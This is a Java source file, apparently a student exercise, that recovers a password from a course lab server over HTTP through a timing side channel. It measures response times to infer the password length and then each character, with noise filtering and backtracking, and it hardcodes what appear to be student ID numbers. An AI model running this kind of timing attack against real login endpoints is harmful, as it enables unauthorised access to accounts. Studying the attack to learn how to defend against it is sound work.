import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.HttpURLConnection;
import java.util.Objects;

public class ex01_M2 {

    //BACK TRACK

    //שונות, ממוצע, סטטיסטיקה, סטיית תקן
    private final static String USER = "305264202"; //"315617506";
    private final static String URL = "http://aoi.ise.bgu.ac.il/?user=" + USER + "&password=";
    private final static int MAX_PASSWORD_LENGTH = 32;
    private final static int LENGTH_TRIES = 3;
    private final static int CHAR_TRIES = 4;
    private final static double LENGTH_SEARCH_NOISE_REDUCE = 1.5;//1.5;
    private final static double PASSWORD_SEARCH_NOISE_REDUCE = 100;//2;
    private final static double THRESHOLD = 1.1;
    private final static long TIME_SCALE = 1;
    private final static char[] CHARS = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};

    public static void main(String[] args) throws Exception {
        //findPassword();
        try{
            findPasswordByMin();
        }catch (Exception ex){
            System.out.println("We have a problem");
        }
    }

//    private static int get_length(){
////        for (int test = 0; test < 50; test++) {
////            long TEST_START = System.currentTimeMillis();
//        String curl = URL;
//        int password_length = 1;
//        try {
//            long[] averages = new long[MAX_PASSWORD_LENGTH];
//            for (int i = 0; i < MAX_PASSWORD_LENGTH; i++) {
//                curl += 'a';
//                URL url = new URL(curl + 'a');
//                long average = 0;
//                long[] times = new long[LENGTH_TRIES];
//                for (int j = 0; j < LENGTH_TRIES; j++) {
//                    times[j] = attempt(url);
//                }
//
//                //clean noise
//                average = get_average(times);
//                //System.out.println("pre-clean average: " + average);
//                for (int k = 0; k < LENGTH_TRIES; k++) {
//                    while (times[k] > average * LENGTH_SEARCH_NOISE_REDUCE) {
//                        times[k] = attempt(url);
//                    }
//                }
//
//                average = get_average(times);
//
//                //Printing times for observation
//                //for (long time: times) {
//                //    System.out.println(time);
//                //}
//                /////////////
//
//                //System.out.println(i + "AVG: " + average);
//                averages[i] = average;
//                //System.out.println(curl);
//            }
//            //for (double avg: averages) {
//            //    System.out.println(avg);
//            //}
//            long max = averages[0];
//            password_length = 1;
//            for (int i = 1; i < MAX_PASSWORD_LENGTH; i++) {
//                if (averages[i] > max) {
//                    max = averages[i];
//                    password_length = i + 1;
//                }
//            }
//            password_length++;
//            System.out.println(password_length);
//            return password_length;
//
//            //System.out.println(in.readLine());
//        } catch (Exception ex) {
//            System.out.println("We have a problem");
//            //System.out.println(ex.getStackTrace());
//        }
////            System.out.println(System.currentTimeMillis() - TEST_START);
////        }
//        return password_length;
//    }

    private static long get_average(long[] times){
        long average = 0;
        for (long time: times) { average += time; }
        return (average/times.length);
    }

    private static long attempt(URL url) throws Exception {
        long endTime;
        long startTime = System.currentTimeMillis();
        BufferedReader in = new BufferedReader (new InputStreamReader(((HttpURLConnection)url.openConnection()).getInputStream()));
        endTime = System.currentTimeMillis();
        return (endTime - startTime);// * TIME_SCALE;
    }

    private static URL[] createUrls(String url, int length, int location) throws Exception {
        URL[] urls = new URL[CHARS.length];
        for (int i = 0; i < CHARS.length; i++){
            StringBuilder temp_url = new StringBuilder(url + CHARS[i]);
            for(int k = 1; k < length - location; k++) {
                temp_url.append('a');
            }

            urls[i] = new URL(temp_url.toString());
        }
        //for (URL curl: urls) {
        //    System.out.println(curl);
        //}
        return urls;
    }

//    private static void findPassword() throws Exception {
//        int length = get_length();
//        String curl = URL;
//        String password = "";
//
//        for(int k = 0; k < length; k++){
//
//            if (k == length - 1){
//                find_last_char(curl,length, password);
//            }
//
//            long[][] times = new long[CHARS.length][CHAR_TRIES];
//            URL[] urls = createUrls(curl, length, k);
//
//            for (int i = 0; i < CHAR_TRIES; i++){
//
//                for (int j = 0; j < CHARS.length; j++){
//
//                    times[j][i] = attempt(urls[j]);
//
//                }
//            }
//
//            char next_char = get_char(times);
//            curl += next_char;
//            password += next_char;
//
//            //long average = get_average(times);
//            //for (int k = 0; k < CHAR_TRIES; k++) {
//            //    while (times[k] > average * 2) {
//            //        times[k] = attempt(temp_url);
//            //    }
//            //}
//            //long[] averages = get_average_new(times, urls);
//            //for(int j = 0; j < CHARS.length; j++)
//            //    System.out.println(CHARS[j] + " " + averages[j]);
////
//            //int char_location = getMax(averages);
//            //curl += CHARS[char_location];
//            //password += CHARS[char_location];
//        }
//        //System.out.println(curl);
//        System.out.println(USER + " " + password);
//    }

    private static long[] get_average_new(long[][] times, URL[] urls) throws Exception {
        long[] averages = new long[CHARS.length];

        for (int i = 0; i < CHARS.length; i++){
            //////
            long average = get_average(times[i]);
            for (int k = 0; k < times[i].length; k++){
                while (times[i][k] > average * PASSWORD_SEARCH_NOISE_REDUCE) {
                    times[i][k] = attempt(urls[i]);
                    average = get_average(times[i]);
                }
            }
            /////
            averages[i] = average;
        }
        return averages;
    }

    private static int getMax(long[] averages){

        //Re attempt if two averages are equal
        long max = averages[0];
        int char_location = 0;

        for (int k = 1; k < averages.length; k++) {
            if (averages[k] > max) {
                max = averages[k];
                char_location = k;
            }
        }
        return char_location;
    }

    private static int find_last_char(String curl, int length, String password) throws Exception {

        URL[] urls = createUrls(curl, length, length - 1);

        for (int j = 0; j < CHARS.length; j++){
            BufferedReader in = new BufferedReader (new InputStreamReader((urls[j].openConnection()).getInputStream()));
            if (Objects.equals(in.readLine(), "1")) return j;
        }
        return -1;
    }

    private static long get_min(long[] times){
        long min = 999999999;
        for (long time : times) {
            if (time < min) min = time;
        }
        return min;
    }

    private static char get_char(long[][] times){
        long[] min_sample = new long[CHARS.length];
        for (int i = 0; i < CHARS.length; i++){
            min_sample[i] = get_min(times[i]);
        }
        return CHARS[getMax(min_sample)];
    }

    private static void findPasswordByMin() throws Exception {

        int length = get_length_by_min();
        boolean second_fail = false;
        String curl = URL;
        String password = "";

        for (int k = 0; k < length; k++) {
            if (k == length - 1) {
                int temp = find_last_char(curl, length, password);
                if (temp == -1){
                    k -= 2;
                    curl = curl.substring(0, curl.length() - 1);
                    password = password.substring(0, password.length() - 1);
                    continue;
                } else {
                    password += CHARS[temp];
                    System.out.println(USER + " " + password);
                    break;
                }
            }

            long[][] times = new long[CHARS.length][CHAR_TRIES];
            URL[] urls = createUrls(curl, length, k);

            for (int i = 0; i < CHAR_TRIES; i++) {

                for (int j = 0; j < CHARS.length; j++) {

                    times[j][i] = attempt(urls[j]);

                }
            }

            if (validate(times)){
                char next_char = get_char(times);
                curl += next_char;
                password += next_char;
                System.out.println(password);
            } else {
                k --;
                if (second_fail) {
                    second_fail = false;
                    k--;
                    curl = curl.substring(0, curl.length() - 1);
                    password = password.substring(0, password.length() - 1);
                } else { second_fail = true; } //maybe second_faild = !second_fail
                //curl = curl.substring(0, curl.length() - 1);
            }
        }
        if (length == 0)
            System.out.println("We have a problem");
    }

    private static int get_length_by_min() {
        String curl = URL;
        int password_length = 0;
        try {
            long[] length_times = new long[MAX_PASSWORD_LENGTH];
            for (int i = 0; i < MAX_PASSWORD_LENGTH; i++) {
                curl += 'a';
                URL url = new URL(curl);

                long[] times = new long[LENGTH_TRIES];
                for (int j = 0; j < LENGTH_TRIES; j++) {
                    times[j] = attempt(url);
                }

                length_times[i] = get_min(times);
            }

            password_length = getMax(length_times) + 1;

        } catch (Exception ex) {
            System.out.println("We have a problem");
        }
        System.out.println(password_length);
        return password_length;
    }

    //DONT FORGET TO VALIDATE

    private static boolean validate(long[][] times){
        boolean ans = false;
        long average = 0;
        long[] averages = new long[times.length];
        for (int i = 0; i < times.length; i++){
            long temp = 0;
            for (int j = 0; j < times[0].length; j++){
                average += times[i][j];
                temp += times[i][j];
            }
            averages[i] = temp / times[0].length;
        }
        average = average / (times.length * times[0].length);

        for (long average1 : averages) {
            if (average1 > average * THRESHOLD) ans = true;
        }

        return ans;
    }
}

//אולי ללבדוק אם יש אות עבורה כל הדגימות גדוללות מהטרשהולד במקום ממוצע
